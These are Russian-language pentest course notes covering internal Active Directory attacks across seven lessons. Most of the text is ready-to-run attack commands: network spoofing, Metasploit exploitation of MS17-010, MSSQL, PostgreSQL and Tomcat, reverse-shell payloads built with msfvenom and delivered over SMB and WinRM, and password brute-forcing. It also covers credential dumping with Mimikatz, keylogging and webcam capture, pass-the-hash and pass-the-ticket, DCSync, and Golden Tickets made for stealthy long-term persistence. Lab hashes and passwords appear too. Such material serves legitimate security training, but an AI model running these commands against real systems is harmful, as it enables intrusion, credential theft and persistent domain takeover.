Занятие 1

Внутренний пентест - моделируем нарушителя внутри сети

Черный ящик - гость
Серый ящик - сотрудник

PSI DSS - требования к пентесту, задача получение "Данных платежных карт"



Карта атаки
Мы --> Окружение (чаще всего active directory) --> Повышение --> Цель

План
1. Wireshark
2. Сканирование
3. "Пробив" (узнаем что можно)
4. Сбор loot (повышение)
5. Достижение цели



Воткнувшись в сеть и запустив wireshark мы ловим широковещательный трафик по следующим протоколам:

STP (защита от петель в сети)
Если в destination - Spaning-Tree-For-Bridges, то в сети стоит самая старая версия STP. Ее можно обмануть и использовать в своих целях
STP DOS:
	https://bugtraq.ru/library/books/stp/chapter06/
	http://cybervlad.net/stp/index.html

sudo yersinia -G (или -I в консольном режиме)

Защита от STP (есть в 90% случаев)
	Включение BPDUGuard и BPDUFilter
	Отключение STP на портах access (для остановки получения BDPU от пользователей)
	Port Security



ARP (50%)
ARP spoofing
	mitmf (фреймворк уже не поддерживаеся, но пока жив арп, н будет актуален)
	ettercap -T 10.10.10.10 -X --httpd --proxy-https --proxy
	arpspoof -i eth0 -t 10.10.10.10
	Intercepter-NG


	
DTP (Dynamic Trunking Protocol) (5%)
	Встречается очень редко, но можно перепрыгвать по виланам
	Scapy
	dtp.spoof.py



VTP (Обмен нформации о существовающих VLAN) (5%)
	


Rogue DHCP (90%)
(Full Slaak Attack) Очень мощная атака
В ненастроенной IPv6 сети можно стать роутером
Этот стандарт дефолтно включен на всех устройствах, более того, в WIndows IPv6 приоритетнее остальных протоколов
Но это может так-же работать как дос
	mitm6 -i eth0  	(упрощенная версия, которая не кладе сеть)



HSRP (8%)
	сморим, не передается ли autheticatio data в чистом виде
	yersinia
	scapy



RIPv2 (2%)
	если видим RIP - сразу пишем об эом как об уязвимостии



OSPF (1%)
	нет инструментов для атак



EIGRP
	Как и большнство атак на маршрутизацию, не используется, т.к. вызывает дос
	eigrp tools
	t50	



ICMP 
	ICMP  Redirect



NBT-NS/LLMNR  poisoning 
	Порядок поиска хоста по DNS
	file "hosts"
	Cash DNS
	Request DNS
	NBT-DNS



WPAD (98%)
По дефолту включен в винде, позволяет подсунуь нашг прокси и гнать весь трафик через него
	Responder
	Mitm6
	Inveigh
	msf (auxiliary/spoof/ndns/nbns_response) (auxiliary/spoof/llmnr/llmnr_response)



CDP (Cisco Discovery Protocol)
Раскрывае много информации о девайсе, реальный ip, VLAN, в котором мы находимся





Занятие 2

msf

Auxiliary
Exploits
Payloads
Post
Encoders (в теории скрывают вредоносное по от антиврусов. На практике больше используются на CTF и OSCP. Например для обхода запрещенных символов)



Auxiliary
Сбор информации



Exploits
use exploit/multi/handler

Используяются в сочетании с payload



Payloads
Bind vs Reverse
	Meterpreter
	Shell
	Command exec



Post
Постэксплуатация
Сбор  перечисление информации о системе
Сбор и перечисление иинформации о домене
Pivoting
Сканирование



Все модули сосотоят из:
Name
Description
Author
Disclosure date
Platform/Arch
License
Target (если эксплоит не работает, возможно таргет выбран не верно)



Настройка среды msf
$ sudo postgresql start (enable)
$ sudo msfdb init
$ msfconsole
msf6> db_status		Проверить статус базы данных

msf6> db_connect -y /usr/share/metasploit-framework/config/database.yml



Search 
msf6> search name:mysql
msf6> search platform:aix
msf6> search type:post
msf6> search cve:2011 author:jduck platform:linux

Grep
msf6> grep http search oracle
msf6> grep ms17 search windows
Сначала что грепаем, потом откуда грепаем 



Workspace
msf6> workspace -a <name>	Создаем рабочее пространство
msf6> workspace <name>		Перейти в рабочее пространство



Options
msf6> show options
msf6> show advansed
msf6> show targets
msf6> set <option>
msf6> unset <option>		
msf6> setg <option>		Глобальное значениие параметра
msf6> unsetg <option>		Снять глобальное значение параметра



Sessions
msf6> sessions -l		Список активных сессий
msf6> sessions -i <number>	Подключииться к сессии	
msf6> sessions -c 		Выполнение системной команды
msf6> sessions -C		Выполнениие команды метерпретера
msf6> sessions -K		Убить все сессии

Jobs
msf6> jobs -l			Список запущенных хендлеров и серверов
msf6> jobs -K			Убить все задачи



Meterpreter
Migrate (мграциия под другой процесс, что бы было сложнее задетектить процесс)
Download/Upload
Normal Linux comands
Loading of other modules (Powershell, Python (если на хосте нет питона), Kiwi...)



Masscan (для сканирования очень больших подсетей)
$ masscan 192.168.0.0/16 -p 1-65535 --rate=9999999 -oX scan_result

Nmap
$ nmap -Pn (десктопная внда не отвечает при включенном пинг скане) -n -sV (чаще всего не нужно пр массовом скане) \
--min-rate=400 --min-parallelism=512 (оптимальный параметр подобраный опытным путем) -p 21, 22, 445, 623, 1433, 5432, \
5555, 8080, 8081, 8180, 8443, 4786, 1099, 27017 --open -oA result -v 192.168.0.0/16

21 - ftp (если можно подключиться анонмно, это хорошо)
22 - =)
445 - smb
623 - ibmi
1433 - mssql (слабый пароль на учетной записи SA)
3389 - rdp (свежая bluekeep)
5432 - postgresql (слабая конфигурация пароля)
5555 - HP dataprotector (часто он без пароля)
8081 - tomcat для деплоя java прложений (учетка tomcat:tomcat)
4786 - cisco smart install (по умолчанию включен, можно стащить конфиг циски, в котором может лежать пароль в чстом или кодированном виде)
1099 - 
27017 - mongodb (не требует авторизации по дефолту)



Типовые вектора "пробива"
MS17-010 
MSSQL
PostgreSQL
Tomcat





Занятие 3

##### MS17-010 #####

smb_ms17_010 (60%)
	ms17_010_eternalblue (иногда может уронить машину. Только x64)
	ms17_010_psexec (если pipe доступен, то лучше использовать во всех случаях)
	ms17_010_eternalblue_win8 (для win8)
	*Если машна на Windows 5.1, то лучше использовать windows/smb/ms08_067_netapi

msf6> cd <folder with scan> 				Переходим в папку со сканом
msf6> db_import scan					Подгружаем файл сканирования в базу данных msf
msf6> services						Вывод информации из базы данных
msf6> services -p 445					Выводм только с портами 445

msf6> use auxiliary/scanner/smb/smb_version		Модуль собирает некоторую инфомрацию о SMB
msf6> options						
msf6> services -p 445 -R				Устанавливаем дапазон машиин как RHOST
msf6> set threads 50					
msf6> set verbose false					Отключаем лишний вывод информации
msf6> run						Запускаем

msf6> services -p 445					Теперь имеем всю информацию

Сканируем на ms17_010
msf6> use auxiliary/scanner/smb/smb_ms17_010		Сканируем на ms17_010
msf6> set threads 100
msf6> set verbose false
msf6> set check_pipe true				Заодно ищем открытые пайпы		
msf6> run

msf6> vulns 						Показывает все найденные уязвимости

Эксплуатируем psexec
msf6> use windows/smb/ms17_010_psexec			Если нашли пайп, то используем psexec
msf6> set rhost <ip>
msf6> set payload windows/x64/meterpreter/reverse_tcp	Для ms17_010 нужно выбрать 64-битную версию
msf6> set lhsot <tun0>					Вместо адреса можно указать интерфейс
msf6> run

Доп варианты нагрузок, если системы защиты блокируют
windows/x64/meterpreter/reverse_https
windows/x64/meterpreter/reverse_tcp_rc4
windows/x64/shell_reverse_tcp
windows/x64/shell/reverse_tcp




##### MSSQL #####

mssql (20%)
	mssql_login (брут учетных записей, в т.ч. дефолтной 'sa')
	mssql_exec (исполняет одну единственную команду)
	mssql_payload (указываем адрес, учетку и пароль к mssql и получаем шелл)

Подбираем учетные данные
msf6> services -p 1433					Сортируем по порту mssql
msf6> use auxiliary/scanner/mssql/mssql_login		Брут учетки
msf6> set rhosts <ip>
msf6> set USERNAME <sa>					Не обязательно, по дефолту будет 'sa'
msf6> set pass_file </usr/share/wordlists/rockyou.txt>  Выбираем словарь для брута
msf6> set threads 100
msf6> set stop_on_success true				Остановка после успешно найденного пароля
msf6> run

msf6> creds						Выводим все сбрученные креды

Эксплуатируем
msf6> use exploit/windows/mssql/mssql_payload
msf6> set password <pass>				Ставим найденый пароль
msf6> set lhost <tun0>
msf6> set rhost <ip>
msf6> run




##### PostgreSQL #####

Часто встречается стандартная учетка postgres:postgres
Может висеть на линуксе или на винде

postgres (15%)
	postgres_login
	postgres_payload
	postgres_copy_from_program_cmd_exec (в свежих версиях)

Брутаем стандартные учетки
msf6> use auxiliary/scanner/postgres/postgres_login
msf6> set rhosts <ip>
msf6> run

Эксплуатация под windows
msf6> use exploit/windows/postgres/postgres_payload
msf6> set rhost <ip>
msf6> set lhost <tun0>
msf6> run	
Если ошибка - смотрим на строку с ip аддресом (мб у нас другая опреационка?)

Эксплуатация Linux
msf6> use exploit/linux/postgres/postgres_payload	Если все-таким во второй строчке написано про linux =)
msf6> set rhosts <ip>
msf6> set lhost tun0

*Если система 64 битная
msf6> show targets					Список возможных таргетов
msf6> set target Linux\ x86_64				Если во второй строчке сказано, что у нас 64 система
msf6> set payload linux/x64/meterpreter/reverse_tcp
msf6> run




##### Tomcat #####

tomcat (10%)
	tomcat_mgr_login (брутаем учетные данные tomcat)

Брутаем стандартные учетоки
msf6> use auxiliary/scanner/http/tomcat_mgr_login
msf6> set rhost <ip>
msf6> run

Переходим на сайт 
http://<ip>:8080/manager/html

Генерируем шелл, завернутый в war файл
$ msfvenom -p java/meterpreter/reverse_tcp LHOST=<наш ip> LPORT=4444 -f war -o tomcatshell.war

Поднимаем хендлер
msf6> use exploit/multi/handler
msf6> set lhost tun0
msf6> set payload java/meterpreter/reverse_tcp		Важно выбрать то-же пейлоад, что указали в msfvenom
msf6> run

На сайте в "war file to deploy" прикрепляем наш war файл
Обновляем страницу
Жмем по загруженному файлу в Applications




Лайфхаки

В show dvanced можно сразу после получения сессии выполнить скрипт (autoscript)

Если на машине стоит антивирус, то mssql_exec 

set EXECUSTOM 			Позволяет загрузить кастомный сервисный exe файл

$ killall <telegram>		Если девушка пишет по время занятия

$ zcat <archive>		cat файл из архива, без предварительной распаковки

meterpreter> help		ооочень много классного!
meterpreter> getid		кто текущий пользователь
meterpreter> webcam_list 	список камер
meterpreter> screenshot		сделать скрин
meterpreter> keysacn_start	запускаем кейлоггер (не идеально, но работает)

$ python -c "import pty;pty.spawn('/bin/bash')"		Получаем красивую оболочку на лиинуксовый шелл

msf6> sessions -C <ps> all	Выполнить команду сразу на всех background сессиях



Логирование действий
msf6> spool </home/hackers_log>		Выводим лог в файл
msf6> set TimestampOutput true		Включаем временную метку для логирования



Горизонтальное перемещение
"Марк Русинович Windows Internals" 	Очень полезная книга о работе windows



Выполнение кода на узле с учетной записью
PsExec  (445)  исполнение кода 
Wmiexec (135)  исполнение кода через удаленный реестр или планировщик задач
Winrm  (5985)  удаленная сессия через powershell
RDP    (3389)  сразу получаем неплохие привелегии
SSH	 (22)  =)

auxiliary/scanner/smb/smb_login 	Сканируем, подходит ли учетная запись



Этапы выполнения PsExec (445)
1) С учеткой локального админа подключаемся к smb шаре и записываем туда сервисный бинарник
2) Через sc.exe создаем сервис из нашего бинарника
3) Запускаем сервис
<здесь мы имеем машину во все порты>
4) Останавливаем сервис 
5) Удаляем сервис
6) Удаляем бинарник

Эксплуатация легитимными средствами (вообще не палится)
https://docs.microsoft.com/en-us/sysinternals/downloads/psexec	Инструмент
C:\> psexec \\<192.168.122.66> -u <Administrator> -p <Qq123> -c cmd.exe



Impacket
https://github.com/SecureAuthCorp/impacket
cd impacket/examples

RCE по протоклам DCE RPC
$ pyhton atexec.py ignite/Administrator:Qq123@192.168.1.105 systeminfo
                                     ^домен ^учетка       ^pass ^адрес

(445) PsExec
$ python psexec.py ignite/Administrator:Qq123@192.168.1.105

(135) Smbexec (с большей вероятностью не будет забанен антивирусом)
$ sudo python smbexec.py ignite/Administrator:Qq123@192.168.1.105 -mode <SHARE/SERVER> 		SERVER почти не палится, но требует рут

(135) Wmiexec (оставляет меньше следов чем smbexec, выполняет через WMI)
$ python wmiexec.py ignite/Administrator:Qq123@192.168.1.195 dir



(5985) WinRM (легитимный, но включен не везде. Сразу получаем powershell)
$ gem install evil-winrm
$ evil-winrm -i 192.168.1.105 -u Administrator -p 'Qq123'




NTLM Hash
Хранится в WINDOWS/system32/config/sam
Для расшифровки нужен файл WINDOWS/system32/config/system
Administrator:500:01fc5a353edafff4cb37са4ee:5412abx756e64d84cb735a46cbac:::
^login        ^RID^LM hash    (4ee = empty) ^NT hash    (9c0 = disabled)



Hash Dump
С правами локального админа дампим хеши
meterpreter> hashdump

Mimikatz & Kiwi
meterpreter> load kiwi		Загружаем модуль Kiwi
meterpreter> help		Появляется много возможны паролей для извлечения
meterpreter> creds_all		Вытаскиваем все пароли



Pass the Hash
msf6> use auxiliary/scanner/smb/smb_login	Проверяем, подходит ли наш хеш
msf6> set SMBpass <hash>
msf6> use exploit/windows/smb/psexec
msf6> set SMBpass <hash>			Используем хеш вместо пароля



Impersonate token 
meterpreter> getsystem		Получить права системы за один клик, если есть такая возможность

Если антивирус не дает повысить привилегии другим образом (реально работает!)
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"




После получения доступа с правами системы можем:
procdump 
mimikatz
kiwi



Group Policy
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\		Хранилище груповых политик



Bash
Ctrl + R	Найти ии выполнить команду из истории





Занятие 4

C:\>ipconfig > ip.txt			Лучше выводить результат выполнения команд в файл



crackmapexec
https://github.com/byt3bl33d3r/CrackMapExec
$ crackmapexec smb <ip>			Вывести сведения о машине. Система, версия, разрядность...



meterpreter> SET Processor		Вывести сведения об врхитектуре



msfvenom
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meter.exe
msf6> use exploit/multi/handler
msf6> set lhost tun0
msf6> set lport 4444
msf6> set payload windows/meterpreter/reverse_tcp
msf6> run
Отдаем файл

В нем существует много модулей
$ msfvenom --list <format>
$ msfvenom --help			Очень рекомендуется ознакомться

Transform format - то, в каком виде получаем файл
Executable format - то, как файл будет запущен



Chain 1

Начинаем с поиска ms17_010
mfs6> use auxiliary/scanner/smb/ms17_010
192.168.1.109 (Windows 5.1) is likely vulnerale
msf6> use exploit/windows/smb/ms08_067_netapi			Так как мы работаем с XP
meterpreter> hashdump						Сохраняем к себе
meterpreter> load kiwi
meterpreter> creds_all						Тоже копируем

Или если модуль не орабатывает
meterpreter> upload /home/mimikatz.exe				Загружаем скачаный mimikatz
meterpreter> shell
C:\> mimikatz.exe
# PRIVILEGE::debug
# sekurlsa::logonpasswords


Получили
Administator:1004:f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24:::
Administator      BUHGALTE-C8940A  1qaz@WSX
BUHGALTE-C8940A$  MSHOME           (null)

Пытаемся использовать на других машинах
msf6> use auxiliary/scaner/smb/smb_login 
msf6> services -p 445 -R
msf6> set smbuser <Administrator>
msf6> set smbpass <f67ce55ac831223dc187b8085fe1d9df:161cff084477fe596a5db81874498a24>
Curret credentials, but unable to login 			Ученая запись оключена
msf6> set smbpass <1qaz@WSX>					Проверяем и пароли

Подключаемся
msf6> use exploit/windows/smb/psexec
msf6> set smbuser <Administrator>
msf6> set smbpass <1qaz@WSX>
$ crackmapexec smb <ip>						Проверяем разряднось
msf6> set payload windows/<x64>/meterpreter/reverse_tcp

Делаем hashdump при ограничении доступа к памяти
meterpreter> run post/windows/gather/smart_hashdump
Если он падает с ошибкой, то возможно некоторые учетки он не успел выгрузить
проверяем через shell; net user

Если kiwi: loaded 32-bit vesrion on 64-bit architecture
meterpreter> ps							Выводим список процессов и ищем PID 64-биного
meterpreter> migrate <492>					Теперь мы имеем 64-битный meterpreter

meterpreter> sysifo						Информация о машине

Если машина без портов, скорее всего они нестандартные
nmap <ip> -p- --open -sV

WinRM
$ crackmapexec winrm <ip>					Проверяем, действительно ли порт живой
$ crackmapexec winrm <ip> -u administrator -p <pass>		Проверяем креды
$ crackmapexec winrm <ip> -u administrator -p <pass> -x <dir>	Выполнить команду "dir"

Загрузим шелл через WinRM
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meter.exe
$ sudo smbserver.py <name> .
$ crackmapexec winrm <ip> -u administrator -p <pass> -x "<\\<name>\meter.exe>"

Или без поднятия сервера:
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f psh-cmd		Копируем вывод команды
msf6> use exploit/multi/handler
$ crackmapexec winrm <ip> -u administrator -p <pass> -x "rrfGV..дохрена всего..56VBy=" Вставляем то, что скопировали ('=' важно)



Возможно придется перебиратьь target
msf6> set smbdomain <domain.local>
не забываем про incognito

239
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4816afb5a756771974bd33c742f4914:::
атрибуты, рдп, 




Занятие 5

Kerberos 
Протокол для аутентификации пользователей при входе в систему
Часто встречается в Windows AD

AS - authentification server 
TGS - ticket-granting server

В Kerberos синхронизация времени крайне важна

Port 88 (kerberos) - признак контроллера домена



Атаки

Kerberos Brute
узнав корпоративный шаблон учетных записей (I.Ivanov, Ivanov.I.S...)
можно создать словарь по шаблону и после этого побрутить
msf6> use auxiliary/gather/kreberos_enumusers
msf6> set rhosts <>
msf6> set USER_FILE <user.txt>
msf6> set DOMAIN <ignite.local>
msf6> exploit
Узнав существующие учетки бруатем их по словарям



AS Rep Roasting/impacket
Если отключена Kerberos preauthentication у пользователя, можно получить его tgs, который можно брутить
$ getmpusers.py



Kerberoasting/impacket (90%)
GetUserSPNs.py -request -dc -ip 10.10.10.100 active.htb/svs tgs



$ carckmapexec smb 192.168.1.0/24		Сканируем адреса на smb порт





Занятие 6

Responder (очень важный инструмент)
https://github.com/SpiderLabs/Responder
$ responder -I eth0 -w -r -f -F -v -v -vv 
Атака не деструктивная, но может собрать много хешей с домена

$ hashcat -m 5600 hash -o hash.out /usr/share/wordlists/rockyou.txt



LSASS

Mimikatz
Перед использованием нужно отключить антивирус

Вытащить все креды
mimikatz # privilege::debug			
mimikatz # sekurlsa::logonPasswords full	

Для XP, 2000 используем Mimilove



Поднимаем хендлер
msf6> use exploit/multi/handler
msf6> set LRORT 7777
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> run

Готовим пейлоад
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=7777 -f exe -o meter.exe	

Поднимаем smb шару с пейлоадом
$ sudo python3 impacket/examples/smbserver.py kek .	

meterpreter> getuid
meterpreter> getsystem
meterpreter> run post/windows/gather/smart_hashdump





Зантятие 7

Pass the Ticket
meterpreter> kerberos_ticket_list		Список kerberos билетов



Pass the Ticket (Windows)
Mimikatz:
> mimikatz.exe
# privilege::debug
# token::elevate
# sekurlsa::tickets/export
# exit
> dir | findet "Administrator" | findstr "krbtgt"
[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi

> mimikatz.exe
# privilege::debug
# kerberos::ppt [0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi
File: '[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi': OK
# exit



Pass the Ticket (Linux)
meterpreter> kiwi_cmd "\"sekurlsa::ticket/export\""

https://github.com/Zer1t0/ticket_converter
$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
$ export KRB5CCNAME=/home/user/velociraptor.ccache
$ psexec.py -k -no-pass Server01.domain.local n		



Overpass the Hash (Windows)
> mimikatz.exe	
# privilege::debug
# sekurlsa::logonpasswords
# sekurlsa::pth /user:duff/domain:jessybrings.com/ntlm:{ntlm hash we grabed}
Билет добавится в память процесса lsass

Команда из чата (вроде запуск логина с кербероса)
mimikatz # sekurlsa::pth /user:invader /domain:LOCALHOST /ntlm:NTLM /run:"mstsc /v:10.0.0.2"


Overpass the Hash (Linux)
$ python impacket/examples/getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
$ python getTGT.py <domain_name>/<username> -aesKey <aes_key>



dcsync
$ python impacket/examples/secretsdump.py -hashes <hash> DOMAIN/den.adm:pass@192.168.0.6 -ntds NTDS -outputfile DUMP
Заодно вытягиваем историю паролей



Golden Ticket
Требует получения доступа к krbtgt
$ python impacket/examples/lookupsid.py DOMAIN/user:pass@192.168.1.1 -hashes <hash>	Получаем sid
S-1-5-21-450836121-1649635954-203960036
> mimikatz
# kerberos::golden /krbtgt:<hash> /admin:administrator /domain:demo.local /sid:S-1-5-21-4508... /ticket:administrator.ticket.bin

$ ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> -dc-ip <ip> <username>
$ export KRB5CCNAME=<ip>.ccache
$ psexec.py -k -no-pass Administrator@<domain> -target-ip <ip> 

Можно создать несуществующего пользователя, что собьет с толку админов
Можно создать вечный билет, который будет работать хоть через 10 лет. 

Пофиксить это можно только сменой krbtgt пароля два раза, однако в таком случае будет окно в 8 часов, что бы забрать новый пароль и сделать новый Golden Ticket
В таком случае выкурить злоумышленника будет невозможно. Более того, процедура смены пароля достаточно опасная 



Silver Ticket
Максимум на месяц
